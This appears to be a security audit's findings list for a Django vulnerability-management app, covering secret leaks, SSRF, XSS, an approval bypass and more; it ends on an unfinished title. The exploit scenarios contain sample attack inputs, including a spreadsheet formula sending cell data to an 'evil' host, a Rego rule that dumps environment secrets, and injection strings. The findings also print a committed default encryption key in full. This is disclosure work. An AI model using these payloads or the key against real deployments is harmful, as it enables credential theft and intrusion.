findings.title: Issue-tracker API key returned in product API responses to any user with read (View) permission
findings.description: ProductSerializer uses exclude=[...] (not including issue_tracker_api_key) and inherits fields='__all__'; no write_only/extra_kwargs masking, and the only to_representation override (ProductCoreSerializer) does not pop it. ProductViewSet uses (IsAuthenticated, UserHasProductPermission), so a read-only Viewer can GET /api/products/{id}/ (and the list endpoint) and receive the cleartext Jira/GitHub/GitLab token. Directly contrasts ApiConfigurationSerializer.to_representation, which pops api_key unless the caller holds Api_Configuration_Edit.
findings.exploit_scenario: A low-privilege team member added to a product as a read-only Viewer calls GET /api/products/{id}/ and reads issue_tracker_api_key straight from the JSON — no edit rights, no DB access — then reuses the token against the external tracker.
findings.recommendation: Add extra_kwargs={'issue_tracker_api_key': {'write_only': True}} to the Product serializers, or override to_representation to pop it for callers lacking product-edit permission (mirroring ApiConfigurationSerializer). Combine with encrypting it at rest (F-002).
findings.confidence_reason: Confirmed: field is in neither exclude list, has no write_only/masking, and the only to_representation override does not pop it; read-permission viewers receive it cleartext, in clear contrast to ApiConfiguration's api_key masking.

findings.title: Issue-tracker API key stored unencrypted at rest while sibling credentials use EncryptedCharField
findings.description: Product.issue_tracker_api_key (line 101) and issue_tracker_username (100) are plain CharField, confirmed at model and migration level. They hold the bearer/PRIVATE-TOKEN/basic-auth credential used against Jira/GitHub/GitLab (github_issue_tracker.py:124, gitlab_issue_tracker.py, jira_issue_tracker.py:21-22). Functionally identical secrets elsewhere use EncryptedCharField: Api_Configuration.api_key/basic_auth_password (import_observations/models.py:44,49) and JWT_Secret.secret (access_control/models.py:104). The issue-tracker token is written to the DB in cleartext while the siblings are encrypted with FIELD_ENCRYPTION_KEY.
findings.exploit_scenario: Anyone with DB-read access (DBA, backup tarball, read replica, SQL injection elsewhere) runs SELECT issue_tracker_api_key FROM core_product and gets working tracker tokens in cleartext — whereas the encrypted siblings would additionally require FIELD_ENCRYPTION_KEY.
findings.recommendation: Change issue_tracker_api_key (and issue_tracker_username if it carries credentials) to EncryptedCharField to match Api_Configuration/JWT_Secret; add a data migration to re-encrypt existing rows.
findings.confidence_reason: Verified plain CharField at model+migration vs EncryptedCharField siblings; the field is a real credential with no encryption anywhere, so a DB dump leaks it cleartext.

findings.title: API-token auth loops Argon2 verify over every token in the DB on each request
findings.description: _validate_api_token loads API_Token_Multiple.objects.all() (line 51) and runs PasswordHasher().verify() against the attacker-supplied bearer string for every token until a match (line 54), with no indexed/prefix narrowing and no early exit. Argon2 verify is deliberately expensive. Cost is O(N) in stored-token count, performed unconditionally for any request carrying an 'APIToken <x>' header — fully attacker-controlled, no prior auth. The 10/s AnonRateThrottle caps request rate but not per-request CPU/memory amplification.
findings.exploit_scenario: On an instance with a few hundred API tokens, an attacker streams requests with a bogus APIToken header at/under the anon rate limit; each request forces N Argon2 verifications, saturating the worker pool and denying service. No valid token needed.
findings.recommendation: Give each token a random non-secret public id/prefix stored alongside the hash; transmit '<id>.<secret>', look up the single row by indexed id, then run exactly one ph.verify — making auth O(1) and removing the untrusted-input amplification.
findings.confidence_reason: Code confirmed: unindexed full-table loop of Argon2 verifies on untrusted input, no early exit; genuine algorithmic amplification gated only by a 10/s throttle (impact magnitude scales with token count).

findings.title: Dependency-Track requests default to verify_ssl=False, sending the API key over an unverified TLS channel
findings.description: Api_Configuration.verify_ssl = BooleanField(default=False). The value is passed to requests.get(..., verify=verify_ssl) in dependency_track/parser.py:54 and :152; the line-54 call also sends the X-Api-Key header. Because the default is False, any Api_Configuration created without explicitly enabling verify_ssl accepts any server certificate. base_url is user-controlled. The server therefore sends a secret API key to a user-set host over a TLS connection it does not validate.
findings.exploit_scenario: A config owner sets an https base_url; an on-path adversary (or malicious/typosquatted host) presents any certificate. With verify defaulting to False the connection succeeds and the X-Api-Key header is delivered to the attacker.
findings.recommendation: Default verify_ssl=True; require an explicit, warned opt-out; never send the API key when verification is disabled without explicit confirmation.
findings.confidence_reason: Code matches claim exactly — default verify_ssl=False with X-Api-Key sent on the same unverified request; real but conditional on an on-path attacker and overridable by config.

findings.title: User-authored Rego policy can read the server process environment via opa.runtime().env (secret exfiltration)
findings.description: RegoInterpreter builds a bundle directly from the attacker-supplied rule.rego_module with no builtin allow-list, no capabilities restriction, and strict_built_in_errors at default. regopy/rego-cpp 1.3.0 implements opa.runtime() (its env key returns the OPA/Python process environment) — unlike http.send/net.*/crypto.* which the same library explicitly stubs out. Empirically confirmed in the in-repo .venv: a module reading opa.runtime().env.X returned the value and a full env dump worked. The query result flows into observation status/severity/priority/vex_justification (rule_engine.py), which are persisted, shown in the UI/observation log, and emitted in exports. In a real deployment the env holds DJANGO_SECRET_KEY, DB credentials, OAuth/tracker tokens, S3 keys. Rego rules auto-approve unless product_rules_need_approval is enabled; opa.runtime is non-obvious to a reviewer.
findings.exploit_scenario: A user with rule-create permission (or on an instance with approval off) creates a rule `rt := opa.runtime(); rule := {"status": rt.env.DJANGO_SECRET_KEY}`, applies it to a viewable product, and reads the resulting status/observation-log to recover the secret. Swapping the env key exfiltrates the DB password or tracker tokens. No outbound network needed.
findings.recommendation: Restrict the interpreter's builtins via an OPA capabilities allow-list (strip opa.runtime and unneeded opa.*/rego.*). If regopy 1.3.0 exposes no capabilities API, statically reject any rego_module referencing opa.runtime at save time and run evaluation in an env-scrubbed subprocess.
findings.confidence_reason: Empirically confirmed unrestricted opa.runtime().env in attacker-authored Rego whose result writes to persisted/displayed observation fields; only minor doubt is field choices/max_length constraining how cleanly secrets land per field, not whether the leak works.

findings.title: Committed default DJANGO_SECRET_KEY in shipped prod compose files
findings.description: Both prod compose files ship DJANGO_SECRET_KEY: ${SO_DJANGO_SECRET_KEY:-NxYPEF5l...} (docker-compose-prod-postgres.yml:85, -mysql:85). config/settings/base.py:29 reads env('DJANGO_SECRET_KEY') with no in-code default, so this committed literal is the effective production value if the operator does not set SO_DJANGO_SECRET_KEY. SECRET_KEY signs Django sessions (SessionMiddleware/contrib.auth are present), password-reset tokens, and other signed values — all forgeable when the key is globally known. (Primary API auth uses a separate DB-stored JWT secret, which bounds the impact.)
findings.exploit_scenario: An operator deploys the prod compose unchanged. An attacker uses the public SECRET_KEY to forge signed values Django trusts (password-reset/signing tokens, signed cookies), enabling account takeover or cookie tampering without credential theft.
findings.recommendation: Remove the literal default (drop the ':-...' fallback so compose errors when SO_DJANGO_SECRET_KEY is unset); document per-deployment key generation; rotate the exposed key.
findings.confidence_reason: Verified committed literal + no in-code fallback at base.py:29; SECRET_KEY signs Django sessions/password-reset/signed values — real impact, minor scope nuance (API JWT uses a separate secret) keeps it shy of 9.

findings.title: Committed default FIELD_ENCRYPTION_KEY in shipped prod compose defeats all at-rest field encryption
findings.description: Both prod compose files ship FIELD_ENCRYPTION_KEY: ${SO_FIELD_ENCRYPTION_KEY:-DtlkqVb3wlaVdJK_BU-3mB4wwuuf8xx8YNInajiJ7GU=} (line 86). config/settings/base.py:432 reads it with no in-code default. This Fernet key encrypts every EncryptedCharField — Api_Configuration.api_key/basic_auth_password and JWT_Secret.secret. An operator who doesn't set SO_FIELD_ENCRYPTION_KEY uses a globally-known key, so 'encryption at rest' for those credentials and the JWT signing secret is reversible by anyone with the public repo + a DB dump. With the JWT secret recovered, an attacker forges valid auth tokens for any user including superuser.
findings.exploit_scenario: Operator deploys prod compose without overriding the key. Attacker obtains a DB dump, takes the public key from the repo, Fernet-decrypts core_api_configuration.api_key/basic_auth_password and access_control_jwt_secret.secret, then forges JWTs for arbitrary users — full auth bypass.
findings.recommendation: Remove the literal default and fail closed if SO_FIELD_ENCRYPTION_KEY is unset; document generating a fresh Fernet key per deployment; treat the leaked key as burned.
findings.confidence_reason: Committed default literal is the verified effective fallback in shipped prod compose; it keys Fernet encryption of JWT_Secret/api_key so a silent misconfig is exploitable — a real reportable hardcoded default, not benign env-var config.

findings.title: Stored XSS via SBOM component names assigned to element.innerHTML before mermaid sanitization
findings.description: createMermaidGraph (lines 35-89) builds a Mermaid source string and embeds each component name unescaped via string concatenation. The result is assigned to element.innerHTML at line 111 BEFORE mermaid.run() (line 112) parses/sanitizes it. The browser HTML-parses the assigned string at assignment time, so a component name like 'pkg' instantiates the and fires onerror independently of mermaid's strict-mode pass (which only runs inside mermaid.run). No DOMPurify exists in frontend/src. The dependency strings come from origin_component_dependencies / component_dependencies, built from uploaded SBOM component name/version (cyclone_dx/parser.py:445-454, spdx, osv), stored unsanitized and served via the API.
findings.exploit_scenario: An attacker who can get a crafted SBOM imported sets a component name to 'evil'. When any user opens the affected observation's Origins tab or the component page, line 111 assigns the markup to innerHTML and the payload executes in the victim's authenticated session — stored XSS against viewers including admins.
findings.recommendation: Use element.textContent instead of innerHTML for the Mermaid source, escape/allowlist component names in createMermaidGraph, pin mermaid securityLevel:'strict', and sanitize component name/version on SBOM import.
findings.confidence_reason: Unescaped attacker-controlled SBOM names reach element.innerHTML before mermaid.run, and innerHTML-inserted fires synchronously regardless of mermaid strict mode; residual doubt only on server-side ingestion sanitization.

findings.title: Assessment approval gate bypassable by attaching a severity/VEX downgrade to an "In review" status change
findings.description: save_assessment's approval-needed condition (lines 65-77) is ANDed with `new_status != STATUS_IN_REVIEW`. When new_status=='In review' the whole expression short-circuits to ASSESSMENT_STATUS_AUTO_APPROVED regardless of which other fields changed. Lines 79-91 then call _update_observation with the full submitted set (new_severity/new_priority/new_vex_justification/new_vex_remediations), applied independently of status. The serializer accepts severity+status+vex together with no cross-field validation. So on a product with assessments_need_approval enabled, a user with Observation_Assessment can submit {status:'In review', severity:'None', vex_justification:...} and have the downgrade applied and AUTO_APPROVED with no second approver. IN_REVIEW keeps the observation active, so the impact is the auto-approved severity/VEX ride-along (Critical→None drops it from the per-severity gate count). Same bypass on the bulk path.
findings.exploit_scenario: On a product with assessments_need_approval=True, an attacker with Observation_Assessment PATCHes a Critical finding {status:'In review', severity:'None', vex_justification:'vulnerable_code_not_present'}. The four-eyes gate is skipped, current_severity becomes None, the active-critical count drops, and the security gate flips to passed — without the required approver.
findings.recommendation: Make the IN_REVIEW exemption apply only when status is the ONLY change; compute the approval decision per-field so any severity/priority/vex change forces NEEDS_APPROVAL even alongside an IN_REVIEW transition (or reject mixing them).
findings.confidence_reason: Verified: IN_REVIEW short-circuits the approval AND-chain to AUTO_APPROVED while _update_observation applies severity/VEX unconditionally, serializer accepts all fields together, IN_REVIEW keeps the obs active — real bypass; residual doubt only whether maintainers intend IN_REVIEW as a deliberate self-routing path.

findings.title: NUL-byte stripping applied only to description; title and sibling fields reach the DB raw (regression of fix 156cb2d6)
findings.description: Commit 156cb2d6 added description.replace('\u0000','REDACTED_NULL') at observation.py:254 — only for description. All other attacker-controlled string fields are left untouched: title (CharField, indexed) is set from SARIF rule.name/ruleId, gitleaks RuleID, CycloneDX vulnerability.id; likewise recommendation, scanner_observation_id, Reference.url, Evidence.name/evidence. normalize_observation_fields does not clean these and clip_fields only truncates by length. On PostgreSQL a \u0000 in a text column raises ValueError at save — the exact failure class the description fix addressed — producing an unhandled 500 and aborting the import.
findings.exploit_scenario: An importer (or a third-party scanner whose report is auto-imported) submits a SARIF file whose rule name contains a literal \u0000. json.load accepts it, it becomes observation.title, normalize does not clean it, and observation.save() raises, aborting the import with a 500. Repeatable.
findings.recommendation: Strip/replace \u0000 centrally for all CharField/TextField values — e.g. extend clip_fields to do value.replace('\u0000','REDACTED_NULL') for every text field — so title/recommendation/references/evidences are covered uniformly.
findings.confidence_reason: Confirmed NUL cleaning exists only for description; clip_fields only truncates, title is set raw from parser content, same exception class as the accepted fix 156cb2d6; only residual doubt is per-parser sanitization.

findings.title: Dependency-Track base_url is a user-set host with no allowlist / internal-range block (read-SSRF)
findings.description: api_configuration.base_url (user-controlled CharField) is concatenated with a fixed path and fetched via requests.get at parser.py:54 and :152. No scheme/host/IP validation; no block of loopback, link-local 169.254.169.254, or RFC1918. The serializer test_connection path lets the user trigger the request on demand and check_connection returns response.json() to the caller — a read-SSRF oracle. The X-Api-Key is attached. Actor is a Maintainer/Owner (Api_Configuration_Edit), which lowers but does not void it in multi-tenant deployments.
findings.exploit_scenario: A config owner sets base_url to an internal service or http://169.254.169.254/... and triggers test_connection; the server performs the request from inside the trust zone and the JSON/error body is reflected back, letting the attacker probe internal services and read responses.
findings.recommendation: Validate base_url: enforce https, resolve the host and reject loopback/link-local/private/multicast ranges (re-check after DNS resolution to defeat rebinding), and constrain to an operator-managed allowlist; apply on every request, not just at save.
findings.confidence_reason: Code confirms unvalidated user-controlled base_url fetched server-side with the response body returned (read-SSRF oracle) and a credential header attached; only mitigant is semi-trusted Maintainer authz.

findings.title: GitLab PRIVATE-TOKEN sent to a user-controlled base_url with no host validation
findings.description: product.issue_tracker_base_url (free-form CharField, only trailing-slash trimmed in base_issue_tracker.py:84-87) builds the request URL and every call attaches PRIVATE-TOKEN: <issue_tracker_api_key>. No scheme/host allowlist, no internal-range block. project_id is URL-quoted (path-injection contained) but the host is unconstrained, and requests follows redirects by default, so a credentialed request can be 30x'd to an internal target. (GitHub by contrast forces a constant host.)
findings.exploit_scenario: A product owner sets issue_tracker_base_url to https://attacker.example (or an internal host). On the next issue create/update/close, the server POSTs there with the PRIVATE-TOKEN header, exfiltrating the GitLab token and/or reaching internal services.
findings.recommendation: Validate issue_tracker_base_url (https only, host allowlist or internal-range rejection with post-resolution recheck); set allow_redirects=False on credentialed requests or strip auth headers on cross-origin redirect. Apply to GitHub/Jira flows too.
findings.confidence_reason: Verified — GitLab base_url is user-set with only trailing-slash trimming (no validation), PRIVATE-TOKEN attached on every call, default redirect-following confirms credentialed SSRF; only mitigant is the Maintainer/Owner privilege gate.

findings.title: JSON structure breakout in Slack/Teams notifications via backslash in import-derived observation title
findings.description: The Slack/Teams templates interpolate variables directly into hand-built JSON string values with no autoescape-off, so Django HTML autoescape applies — which escapes < > & ' " but NOT backslash. The sender then post-processes toward JSON: notification_message.replace('"','\"') (line 43) and for Slack also replace(''','\'') (65-66). A title containing a backslash immediately before a quote renders as \ + ", then the replace yields \\" = an escaped backslash followed by an unescaped " — which closes the JSON string early, so attacker bytes become JSON structure. observation.title is a free CharField populated from imports.
findings.exploit_scenario: An attacker who can influence imported scanner output sets a title like `X\" ,"summary":"PHISHING: click https://evil to reset" ,"x":"`. On a triggered Teams notification, the injected \\" closes the title string and the attacker's keys are parsed as real MessageCard JSON — controlling the card summary or injecting an OpenUri action to an attacker URL in a 'trusted' security notification.
findings.recommendation: Stop hand-building JSON in templates with HTML autoescaping. Construct the payload as a Python dict and json.dumps(...) it, passing untrusted values as data; or render each variable with |escapejs and remove the post-render .replace() hacks.
findings.confidence_reason: Verified hand-built JSON templates, autoescape on, and the "→\" replace creates a real backslash-parity string breakout from import-controlled observation.title; only gated by a configured Slack/Teams webhook and import charset.

findings.title: JWT_Secret.load() empty-secret regeneration path is broken (latent), no live empty-secret signing
findings.description: JWT_Secret.load() at line ~124 does jwt_secret.secret(cls.create_secret()) — it calls the string value as a callable (raises TypeError) instead of assigning. In normal flow the secret is never empty because save() (lines 115-116) generates a 32-char value when blank and the DoesNotExist path calls save(). So create_jwt/_validate_jwt always operate on a non-empty random HS256 secret — no live forgery path. Reported LOW as a fragile invariant: if a future change ever persists a blank secret, load() would crash instead of self-healing, and a blank HS256 key would allow trivial JWT forgery.
findings.exploit_scenario: No direct exploit today. Risk materializes only if a migration/admin action stores a blank secret; the intended self-heal in load() then throws, and any path that bypassed save() would sign/verify with an empty key.
findings.recommendation: Fix line 124 to assign (jwt_secret.secret = cls.create_secret()), add a guard in create_jwt/_validate_jwt that refuses to sign/verify when secret is falsy, and add a unit test for the regeneration path.
findings.confidence_reason: Broken line confirmed and save() provably guarantees a non-empty secret on every write path, so it's a genuine latent defect with no live forgery — LOW accurately describes a real but currently-unexploitable bug.

findings.title: NotificationViewSet.mark_as_viewed uses an unscoped lookup, allowing cross-product notification existence probing
findings.description: The custom detail action mark_as_viewed (views.py:66-77) resolves the notification with get_notification_by_id(pk) = unscoped Notification.objects.get(id=...), NOT the per-user product-scoped get_notifications() used by bulk_mark_as_viewed. Because the action never calls get_object(), UserHasNotificationPermission.has_object_permission is never invoked; the only gate is IsAuthenticated. A user in Product A can reference a notification belonging to Product B: a 204-vs-404 response is an existence oracle across all products, and a Notification_Viewed row is written binding the attacker's user to a foreign notification. No foreign content is returned, so impact is limited.
findings.exploit_scenario: An authenticated user iterates pk=1..N against POST /api/notifications/{pk}/mark_as_viewed/; 204 vs 404 reveals which notification IDs exist platform-wide, giving an activity/volume oracle for products they cannot see.
findings.recommendation: Replace get_notification_by_id(pk) with a scoped lookup (get_notifications().filter(pk=pk).first(), 404 if None), or call self.get_object() so the object-level permission runs against the scoped queryset.
findings.confidence_reason: Code confirms the unscoped lookup with no get_object()/has_object_permission gate vs the scoped bulk path; real LOW-impact IDOR (204/404 oracle + inert foreign viewed-row write, no content disclosure).

findings.title: No account lockout on password auth; unauthenticated login/token-mint endpoints brute-forceable
findings.description: AuthenticateView (318), UserAPITokenCreateView (266), and UserAPITokenRevokeView (295) set authentication_classes=[]/permission_classes=[] and funnel username+password through django_authenticate. There is no failed-attempt counter, no lockout, no django-axes (only ModelBackend). The only control is AnonRateThrottle at 10/s by IP; because these views disable auth, UserRateThrottle cannot scope to a user. 10 attempts/s/IP with no per-account lockout permits sustained online guessing, and a distributed attacker is not slowed at the account level. UserAPITokenCreateView is the highest-value target: a correct guess mints a long-lived API token in one call.
findings.exploit_scenario: Attacker knows a username (enumerable from the UI/observation metadata) and runs a guessing loop against POST /api/authentication/create_user_api_token/ at ~10 req/s per IP; no account locks, and on success they receive a persistent API token.
findings.recommendation: Add per-account failed-login throttling/lockout (e.g. django-axes or a cache counter keyed on username with backoff) and a dedicated low scoped-throttle on these three views; consider requiring an authenticated session to mint API tokens.
findings.confidence_reason: Confirmed — auth-disabled login/token endpoints, only ModelBackend, no axes/lockout, IP-only 10/s anon throttle; T10 brute-force/lockout was explicitly in scope so this is a real (IP-throttle-mitigated) auth weakness, not the excluded volumetric class.

findings.title: Committed default admin/admin credentials auto-create a superuser at deploy time
findings.description: The prod compose files set ADMIN_USER:${SO_ADMIN_USER:-admin} / ADMIN_PASSWORD:${SO_ADMIN_PASSWORD:-admin} / ADMIN_EMAIL (lines 68-70). The shipped entrypoint (docker/backend/prod/django/entrypoint:28-44) creates a superuser from these on first boot. The entrypoint alone is safe — it generates a random password when ADMIN_PASSWORD is empty — but the compose layer always injects literal 'admin', so that safety branch never fires and an operator using the published prod compose without overriding SO_ADMIN_PASSWORD gets superuser admin/admin.
findings.exploit_scenario: Operator brings up the published prod stack without setting SO_ADMIN_PASSWORD; the entrypoint creates superuser admin/admin; an attacker logs in with admin/admin and gains full administrative control.
findings.recommendation: Remove the ':-admin' password fallback so compose errors when SO_ADMIN_PASSWORD is unset (deferring to the entrypoint's random-password path), or generate and surface a random default; document a mandatory admin password on first deploy.
findings.confidence_reason: Verified — the committed ':-admin' default in shipped prod compose defeats the entrypoint's random-password fallback, yielding admin/admin on an unoverridden deploy; MEDIUM and operator-overridable keeps it below 9-10.

findings.title: OIDC username claim trusted as the local-account key, enabling account collision/takeover
findings.description: After signature/aud/exp validation, username = payload.get(os.environ['OIDC_USERNAME']) (line 79) and is used as the sole key in get_user_by_username (line 82) to find-or-create the local User. There is no issuer/sub binding and no check that the matched user is an OIDC-provisioned identity — _check_user_change flips is_oidc_user only AFTER the user is selected as the identity. SecObserve uses a single User model / shared username namespace. If OIDC_USERNAME maps to a mutable/non-unique claim (preferred_username, email local-part), an OIDC principal whose claim equals an existing local username (e.g. bootstrap 'admin') is authenticated as that user with its privileges. Exploitability is genuinely config-dependent (a unique immutable claim like sub defeats it).
findings.exploit_scenario: Deployment has local admin 'admin' and enables OIDC with OIDC_USERNAME=preferred_username. An attacker sets their preferred_username to 'admin' at the IdP, obtains a validly-signed token, and OIDCAuthentication resolves it to the existing admin user — superuser access.
findings.recommendation: Bind OIDC identities to (iss, sub) using a stable immutable claim, not a display/username claim; refuse to log in as an existing local user not flagged is_oidc_user/linked to that sub; document that OIDC_USERNAME must be a unique, non-self-serviceable claim.
findings.confidence_reason: Code path confirmed (no iss/sub binding, no is_oidc_user gate before identity is returned) but exploitability hinges on the operator's OIDC_USERNAME claim choice and IdP uniqueness, so triage may downgrade to config-hardening.

findings.title: XLSX export (openpyxl) writes attacker-controllable fields into cells without formula-escaping
findings.description: export_excel writes every non-excluded object attribute straight into a cell via worksheet.cell(row, column, value=value) at export.py:47 (header at :32), with no neutralization of leading formula triggers (= + - @, tab/CR). Unlike the CSV path which uses defusedcsv (line 63), defusedcsv does NOT instrument openpyxl, so XLSX output is unescaped. observation title/description/recommendation and license component_name/effective_license_name are populated from imported scanner reports. All three callers (export_observations_excel, export_license_components_excel, export_product_metrics_excel) route through this shared function.
findings.exploit_scenario: Attacker uploads a report whose observation title is =HYPERLINK("http://evil/?d="&A2&B2,"click") or a DDE payload. A reviewer exports observations to XLSX and opens it; Excel/LibreOffice evaluates the formula, exfiltrating adjacent cells or (with DDE) triggering command execution after a trust prompt.
findings.recommendation: Apply formula-escaping in the export_excel branch before writing string cells (prefix a leading = + - @ tab/CR with a single quote), in a shared helper used by both the header and value writes — matching what defusedcsv does for CSV.
findings.confidence_reason: Real, recognized parallel gap (CSV hardened via defusedcsv, XLSX path unescaped) confirmed in source, but MEDIUM client-side injection requiring the victim to open the file and dismiss spreadsheet warnings.

findings.title: Teams/Slack webhook URL is user-controlled with no/weak host validation (blind SSRF)
findings.description: send_msteams_notification (line 45) and send_slack_notification (68) POST to url=webhook, where webhook is the product/group notification_*_webhook or the global exception_*_webhook setting. Product-level webhooks validate the scheme only and explicitly permit localhost; the global Settings webhooks have no validator at all. No internal-range block. The POST body is a rendered template (no credentials) and the response is discarded, so this is blind SSRF only — a product owner (or superuser for the global ones) can make the server emit POSTs to arbitrary internal hosts.
findings.exploit_scenario: A product owner sets the Teams/Slack webhook to http://internal-service.local/...; when a security-gate or exception notification fires, the server POSTs to that internal endpoint from within the trust zone.
findings.recommendation: Validate webhook URLs: https only, restrict to expected webhook domains (*.office.com / hooks.slack.com) or reject internal/loopback/link-local targets; disable redirect following.
findings.confidence_reason: Confirmed — product webhook validates scheme only (allows localhost) and global webhook has no validation; blind SSRF with no oracle/creds, so low severity but a legitimate finding.

findings.title: Unsanitized user-controlled document_id_prefix injected into Content-Disposition filename (CycloneDX)
findings.description: document_id_prefix is a free-form CharField(max_length=255) with no character restriction. It is stored as a BOM prefix, re-read by _get_cyclonedx_vex_filename (640-650) and interpolated directly, then concatenated unquoted into the Content-Disposition header at views.py:447 ('attachment; filename=' + filename). Django >=4.2 raises BadHeaderError on raw CR/LF, so full response-splitting is not achievable; however quotes, semicolons, and spaces are not blocked, allowing Content-Disposition parameter injection / filename override. The update path replays the stored prefix.
findings.exploit_scenario: An authenticated user creates a CycloneDX VEX document with document_id_prefix = 'report"; filename="malware.exe'; on download the header becomes attachment; filename=report"; filename="malware.exe_<uuid>_0001.json, controlling the suggested download filename for another user.
findings.recommendation: Sanitize the filename via the same allowlist used for CSAF (re.sub(r'[^+\-a-z0-9]+','_', ...)) and/or RFC 6266-quote it; better, apply a strict RegexValidator to document_id_prefix at input time.
findings.confidence_reason: Code confirms unsanitized, unquoted prefix in Content-Disposition; real but minor since Django blocks CR/LF and impact is limited to filename-parameter confusion behind authenticated write access.

findings.title: Whole uploaded report parsed into memory with no content-size cap before walking
findings.description: detect_parser does data=load(file) (json.load, line 45) and for CSV reads the entire file into a string and materializes every row, with no size/row/depth limit. The upload FileField(max_length=255) bounds only the filename. No DATA_UPLOAD_MAX_MEMORY_SIZE/FILE_UPLOAD_MAX_MEMORY_SIZE override exists (and Django's DATA_UPLOAD_MAX does not bound multipart file parts), and no proxy client_max_body_size is set in-repo. So an authenticated importer can POST a multi-hundred-MB JSON/CSV; the full structure is loaded into RAM and parsers re-serialize each entry via json.dumps into evidence, multiplying memory. This is partly volumetric (excluded) with a genuine but modest per-entry amplification.
findings.exploit_scenario: An importer uploads a 300 MB JSON SARIF with tens of thousands of results; the worker loads it via json.load and builds N observations each carrying dumps(result) evidence, spiking RAM to several GB and OOM-killing the import worker.
findings.recommendation: Enforce an explicit upload size limit before parsing (check file.size against a configurable max and reject early), set DATA_UPLOAD_MAX_MEMORY_SIZE + a reverse-proxy client_max_body_size, and cap CSV row count / JSON byte size before json.load.
findings.confidence_reason: Confirmed no body-size cap before json.load and real json.dumps-per-entry amplification, but auth-gated (import permission) and primarily volumetric upload — the excluded class — with only modest amplification, so likely downgraded in triage.

findings.title: Jira client uses a user-controlled server URL with basic_auth credentials, no host validation
findings.description: JIRA(server=product.issue_tracker_base_url, basic_auth=(issue_tracker_username, issue_tracker_api_key)) at lines 18-24. The server URL is the unvalidated user-set issue_tracker_base_url (validate() only checks field presence/consistency; the field is a plain CharField). Basic-auth credentials are sent to whatever host is configured, with no scheme/host allowlist or internal-range block; python-jira sends the credentials on the first call.
findings.exploit_scenario: A product owner points issue_tracker_base_url at an internal or attacker host; the first authenticated Jira call sends the HTTP Basic credentials (base64 username:api_key) there, exfiltrating them and/or reaching internal infrastructure.
findings.recommendation: Validate the Jira server URL (https only, host allowlist / internal-range rejection); prefer operator-pinned base URLs for issue trackers in multi-tenant deployments.
findings.confidence_reason: Real code-level TP (unvalidated base_url + basic_auth to arbitrary host) but exploitation requires a privileged Maintainer/Owner who already legitimately configures their own tracker credentials, so triage will likely downgrade to low-severity hardening.

findings.title: No CPU/time/memory budget around Rego evaluation of untrusted policies
findings.description: query() (rego_interpreter.py:23-39) runs rego_run.query_bundle synchronously in the Django/worker process with no timeout, no step cap, and no memory ceiling, on attacker-authored rule.rego_module. Rego is non-Turing-complete, but a crafted policy (nested comprehensions / large cartesian products over module constants) can drive evaluation time/RAM high, and apply_all_rules_for_product runs it per observation. Heavily gated: a rule must pass the approval workflow (when enabled) before it enters the apply loop, and cost is bounded by the policy's own constants rather than request size.
findings.exploit_scenario: A rule author submits an approved Rego module materializing a large cartesian product; each apply_rules_for_observation blocks a worker and inflates RAM, and a product-wide re-apply over thousands of observations starves the worker pool.
findings.recommendation: Wrap Rego evaluation in a hard wall-clock timeout and a subprocess/thread with a memory rlimit (or a per-task time limit); cap total rule-apply time per product run.
findings.confidence_reason: Code claim accurate (no budget, per-observation loop) but exploitation is gated behind rule approval/auto-approve and bounded by policy constants, so a real-but-low DoS that triage often downranks or accepts.

findings.title: Unsanitized OpenVEX document_id_prefix reaches Content-Disposition filename
findings.description: _get_openvex_filename (631-637) builds urlparse(document_id).path.split('/')[-1] + version, where document_id includes the user-set document_id_prefix (unrestricted CharField). The split('/')[-1] defeats slash-based traversal, but quotes/semicolons/spaces survive into the last path segment and are concatenated unquoted into the header at views.py:323-325. Django blocks CR/LF, so this is Content-Disposition parameter injection, not response-splitting. The update path replays the stored prefix.
findings.exploit_scenario: An authenticated user creates an OpenVEX document with document_id_prefix = 'a"; x="b'; the download header becomes attachment; filename=a"; x="b_2026_0001.json, injecting an extra parameter and controlling the apparent filename.
findings.recommendation: Run the OpenVEX filename through an allowlist sanitizer (as CSAF does) and/or RFC 6266 quote-and-escape it; add an input-time RegexValidator on document_id_prefix.
findings.confidence_reason: Mechanism verified (unvalidated prefix → urlparse split → unquoted filename=), but Django blocks CR/LF so impact is at most header-parameter pollution / messy download name — a genuine but minor LOW.

findings.title: VEX document create/update views rely on default IsAuthenticated; per-product check only when product is set
findings.description: CSAF/OpenVEX/CycloneDX create/update views declare no permission_classes, falling back to the project default IsAuthenticated. The per-product user_has_permission_or_403(product, VEX_Create) check is guarded by 'if product:' (views.py:408-409 etc.). When a request supplies only vulnerability_names and no product, no VEX_Create check runs — any authenticated user can generate a VEX document by vulnerability name and persist a row + increment a VEX_Counter. Impact is bounded because get_observations() filters strictly to the caller's authorized products, so no cross-product data is exposed.
findings.exploit_scenario: A low-privileged authenticated user without VEX_Create on any product POSTs to /api/vex/cyclonedx_document/create/ with only vulnerability_names; the request is accepted and a document scoped to their own observations is created — bypassing the intended VEX_Create capability gate (no cross-tenant leak).
findings.recommendation: Set explicit permission_classes on the create/update views and enforce a VEX_Create/VEX_Edit check that does not depend on product being present (a global VEX capability check when no product is supplied).
findings.confidence_reason: 'if product:' guard confirmed and get_observations() is strictly user-scoped, so it's a real-but-benign missing capability check (defense-in-depth), likely downgraded in triage.

findings.title: Gitleaks secret redaction is a literal substring replace; mismatched Secret/Match can leave the secret stored
findings.description: Redaction uses match.replace(secret,'REDACTED') (line 67) and evidence_string.replace(secret,'REDACTED') (95) — literal substring substitution. The line-94 \r\n normalization (added by fix 5f5a0aff) exists because the evidence string is JSON-serialized; the match path at 67 is not JSON-encoded, so the missing normalization there is arguably correct rather than a bug. The genuine residual: if gitleaks reports Secret as a non-byte-exact substring of Match (truncation, partial match, encoding), the replace silently no-ops and the credential persists in the observation description. The data is the uploader's own report, so exposure is to other viewers of the same product, not cross-tenant.
findings.exploit_scenario: A gitleaks report where the Secret value is not an exact substring of Match leaves the raw secret in the stored description shown to product viewers.
findings.recommendation: Redact by the documented offsets (StartLine/columns) rather than substring matching, and treat redaction failure conservatively (drop the field) when secret is non-empty but not found.
findings.confidence_reason: Discrepancy is real but the line-94 normalization is JSON-escaping (not a portable fix to mirror at 67); residual exposure requires a Match/Secret byte mismatch and is self-submitted LOW-impact, so it likely won't survive triage.

findings.title: Email notification templates disable autoescaping on import-derived title/product/description
